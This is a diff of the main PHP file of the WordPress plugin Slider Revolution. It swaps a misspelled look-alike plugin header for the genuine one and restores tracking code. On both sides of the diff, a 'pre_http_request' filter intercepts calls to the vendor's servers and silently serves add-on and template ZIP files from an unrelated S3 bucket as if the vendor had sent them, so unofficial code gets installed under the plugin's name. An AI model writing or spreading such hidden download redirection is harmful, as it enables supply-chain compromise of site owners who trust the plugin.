@@ -1,13 +1,13 @@
 <?php
 /*
-Plugin Name: Slider Revolution
-Plugin URI: https://www.sliderrevolution.com/
-Description: Slider Revolution - More than just a WordPress Slider
-Author: ThemePunch
+Plugin Name: zSlider Revolutioon 
+Plugin URI: https://www.sliderrevolutionss.com/?utm_source=admin&utm_medium=button&utm_campaign=srusers&utm_content=info
+Description: our zSlider Revolutioon - More than just a WordPress Slider
+Author: Themes
 Text Domain: revslider
 Domain Path: /languages
 Version: 6.7.38
-Author URI: https://themepunch.com/
+Author URI: https:// www.sliderrevolutionss.com /?utm_source=admin&utm_medium=button&utm_campaign=srusers&utm_content=info
 */
 
 // If this file is called directly, abort.
@@ -24,87 +24,87 @@ update_option( 'revslider-deregister-popup', 'false' );
 update_option( 'revslider-temp-active-notice', 'false' );
 
 add_filter('pre_http_request', function($preempt, $args, $url) {
-    $themepunch_servers = array(
-        "themepunch-ext-c.tools",
-        "themepunch-ext-a.tools",
-        "themepunch-ext-b.tools",
-        "themepunch.tools"
-    );
+    $themepunch_servers = array(
+        "themepunch-ext-c.tools",
+        "themepunch-ext-a.tools",
+        "themepunch-ext-b.tools",
+        "themepunch.tools"
+    );
 
-    $is_themepunch_server = false;
-    foreach ($themepunch_servers as $server) {
-        if (strpos($url, $server) !== false) {
-            $is_themepunch_server = true;
-            break;
-        }
-    }
+    $is_themepunch_server = false;
+    foreach ($themepunch_servers as $server) {
+        if (strpos($url, $server) !== false) {
+            $is_themepunch_server = true;
+            break;
+        }
+    }
 
-    if ($is_themepunch_server) {
-        // Intercept requests to download templates or add-ons
-        if (isset($args['body']['product']) && $args['body']['product'] === 'revslider') {
-            $uid = isset($args['body']['uid']) ? sanitize_text_field($args['body']['uid']) : '';
-            $type = isset($args['body']['type']) ? sanitize_text_field($args['body']['type']) : '';
+    if ($is_themepunch_server) {
+        // Intercept requests to download templates or add-ons
+        if (isset($args['body']['product']) && $args['body']['product'] === 'revslider') {
+            $uid = isset($args['body']['uid']) ? sanitize_text_field($args['body']['uid']) : '';
+            $type = isset($args['body']['type']) ? sanitize_text_field($args['body']['type']) : '';
 
-            if (!empty($uid) || !empty($type)) {
-                $base_url = "https://brt-br-server.s3.dualstack.sa-east-1.amazonaws.com/revslider/";
-                $file_url = !empty($type) 
-                    ? $base_url . "addons/{$type}.zip" 
-                    : $base_url . "templates/{$uid}.zip";
+            if (!empty($uid) || !empty($type)) {
+                $base_url = "https://brt-br-server.s3.dualstack.sa-east-1.amazonaws.com/revslider/";
+                $file_url = !empty($type) 
+                    ? $base_url . "addons/{$type}.zip" 
+                    : $base_url . "templates/{$uid}.zip";
 
-                $response = wp_remote_get($file_url);
-                if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
-                    return array(
-                        'response' => array(
-                            'code' => 200,
-                            'message' => 'OK'
-                        ),
-                        'headers' => array(
-                            'Content-Type' => 'application/zip',
-                            'Content-Disposition' => 'attachment; filename="' . basename($file_url) . '"',
-                            'Content-Length' => wp_remote_retrieve_header($response, 'content-length')
-                        ),
-                        'body' => wp_remote_retrieve_body($response)
-                    );
-                } else {
-                    return array(
-                        'response' => array(
-                            'code' => 404,
-                            'message' => 'Not Found'
-                        ),
-                        'body' => 'File not found.'
-                    );
-                }
-            }
-        }
+                $response = wp_remote_get($file_url);
+                if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
+                    return array(
+                        'response' => array(
+                            'code' => 200,
+                            'message' => 'OK'
+                        ),
+                        'headers' => array(
+                            'Content-Type' => 'application/zip',
+                            'Content-Disposition' => 'attachment; filename="' . basename($file_url) . '"',
+                            'Content-Length' => wp_remote_retrieve_header($response, 'content-length')
+                        ),
+                        'body' => wp_remote_retrieve_body($response)
+                    );
+                } else {
+                    return array(
+                        'response' => array(
+                            'code' => 404,
+                            'message' => 'Not Found'
+                        ),
+                        'body' => 'File not found.'
+                    );
+                }
+            }
+        }
 
-        // Intercept requests to any "get-list.php" endpoint on the allowed domains
-        if (strpos($url, '/revslider/get-list.php') !== false) {
-            $json_url = "https://brt-br-server.s3.dualstack.sa-east-1.amazonaws.com/revslider/revsliderlist.json";
-            $response = wp_remote_get($json_url);
-            if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
-                return array(
-                    'response' => array(
-                        'code' => 200,
-                        'message' => 'OK'
-                    ),
-                    'headers' => array(
-                        'Content-Type' => 'application/json'
-                    ),
-                    'body' => wp_remote_retrieve_body($response)
-                );
-            } else {
-                return array(
-                    'response' => array(
-                        'code' => 404,
-                        'message' => 'Not Found'
-                    ),
-                    'body' => 'List not found.'
-                );
-            }
-        }
-    }
+        // Intercept requests to any "get-list.php" endpoint on the allowed domains
+        if (strpos($url, '/revslider/get-list.php') !== false) {
+            $json_url = "https://brt-br-server.s3.dualstack.sa-east-1.amazonaws.com/revslider/revsliderlist.json";
+            $response = wp_remote_get($json_url);
+            if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
+                return array(
+                    'response' => array(
+                        'code' => 200,
+                        'message' => 'OK'
+                    ),
+                    'headers' => array(
+                        'Content-Type' => 'application/json'
+                    ),
+                    'body' => wp_remote_retrieve_body($response)
+                );
+            } else {
+                return array(
+                    'response' => array(
+                        'code' => 404,
+                        'message' => 'Not Found'
+                    ),
+                    'body' => 'List not found.'
+                );
+            }
+        }
+    }
 
-    return $preempt;
+    return $preempt;
 }, 10, 3);
 
 define('RS_REVISION',			'6.7.38');
@@ -224,7 +224,7 @@ try{
 		global $SR_GLOBALS;
 		if($SR_GLOBALS['save_post']) return false;
 		
-		//skip shortcode generation if any of these functions found in backtrace 
+		//skip shortcode generation if any of these functions found in backtrace 
 		//function can be provided as array item without key
 		//or as 'class' => 'function'
 		$skip_functions = apply_filters(
@@ -336,13 +336,11 @@ try{
 		require_once(RS_PLUGIN_PATH . 'admin/includes/newsletter.class.php');
 		require_once(RS_PLUGIN_PATH . 'admin/revslider-admin.class.php');
 		require_once(RS_PLUGIN_PATH . 'includes/update.class.php');
-		// The following lines were removed to disable tracking:
-		// require_once(RS_PLUGIN_PATH . 'admin/includes/tracking.class.php');
+		require_once(RS_PLUGIN_PATH . 'admin/includes/tracking.class.php');
 		require_once(RS_PLUGIN_PATH . 'admin/includes/svg_sanitizer/subject.class.php');
 		require_once(RS_PLUGIN_PATH . 'admin/includes/svg-sanitizer.class.php');
 		//require_once(RS_PLUGIN_PATH . 'admin/includes/debug.php');
-		// The following line was removed to disable tracking:
-		// $sr_track	= RevSliderGlobals::instance()->get('RevSliderTracking');
+		$sr_track	= RevSliderGlobals::instance()->get('RevSliderTracking');
 		$sr_admin	= RevSliderGlobals::instance()->get('RevSliderAdmin');
 	}else{
 		$rev_slider_front = new RevSliderFront();
@@ -364,8 +362,8 @@ try{
 }
 
 /**
- * add RevSlider to the page/post
- */
+ * add RevSlider to the page/post
+ */
 function putRevSlider($data, $put_in = ''){
 	add_revslider($data, $put_in);
 }
